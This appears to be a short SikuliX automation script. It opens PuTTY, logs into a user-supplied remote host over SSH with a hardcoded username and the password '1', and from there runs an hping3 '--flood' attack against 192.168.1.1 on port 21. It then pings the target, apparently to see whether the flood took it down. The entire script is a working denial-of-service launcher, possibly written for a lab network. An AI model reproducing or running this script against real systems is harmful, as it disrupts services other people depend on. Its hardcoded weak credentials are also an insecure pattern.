ip=input("Please enter ip is remoted")
if not ip:
    exit(1)
if ip:   
    doubleClick("1541730402387.png")
    wait("1541732491085.png")
    click("1541732507651.png")
    sleep(1)
    type('sudo putty' + Key.ENTER + '1' + Key.ENTER)
    sleep(2)
    wait("1541748040943.png")
    paste("1541748275609.png", ip)
    type(Key.ENTER)
    if not exists("1541734123038.png"):
        popup("SSH false")
        exit(1)
    else:    
        sleep(1)
        type('quynhdam' + Key.ENTER)
        sleep(1)
        type('1' + Key.ENTER)
        if exists(Pattern("putty-1.png").exact(),3):
            popup('User and Password incorrect')
            exit(1)
        else:
            sleep(3)
            type('sudo hping3 -2 -c 10000 -d 120 -S -p 21 --flood 192.168.1.1' + Key.ENTER + '1' + Key.ENTER)
    doubleClick("1541730402387.png")
    wait("1541732491085.png")
    click("1541732507651.png")
    sleep(1)
    type('ping 192.168.1.1' + Key.ENTER)
    sleep(2)
